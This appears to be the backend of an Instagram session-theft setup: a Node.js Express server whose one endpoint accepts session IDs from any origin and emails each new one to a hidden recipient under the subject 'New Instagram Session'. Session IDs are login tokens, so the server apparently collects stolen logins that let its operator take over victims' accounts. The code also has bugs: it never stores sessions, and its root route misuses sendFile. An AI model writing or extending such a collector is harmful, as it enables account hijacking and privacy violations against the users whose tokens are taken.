require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const nodemailer = require("nodemailer");
const dotenv = require("dotenv");
dotenv.config({ path: "./.env" });
const cors = require("cors");

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

// Session Model
const sessionSchema = new mongoose.Schema({
  sessionId: { type: String, unique: true },
  createdAt: { type: Date, default: Date.now },
});
const Session = mongoose.model("Session", sessionSchema);

// Email Transport
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// API Endpoint
app.post("/api/sessions", async (req, res) => {
  try {
    const { sessionId } = req.body;

    if (!sessionId) {
      return res.status(400).json({ error: "Session ID required" });
    }

    // Check if session exists
    const existingSession = await Session.findOne({ sessionId });
    if (existingSession) {
      return res.status(400).json({ error: "Session already exists" });
    }

    // If we get here, it's a new session
    await transporter.sendMail({
      to: process.env.RECIPIENT_EMAIL,
      subject: "New Instagram Session",
      text: `New session ID: ${sessionId}`,
    });

    res.json({ success: true, message: "New session recorded" });
  } catch (error) {
    if (error.code === 11000) {
      // MongoDB duplicate key error
      return res.json({ success: false, message: "Duplicate session" });
    }
    console.error("Error:", error);
    res.status(500).json({ error: "Server error" });
  }
});

app.get("/", (req, res) => res.sendFile("hello word"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
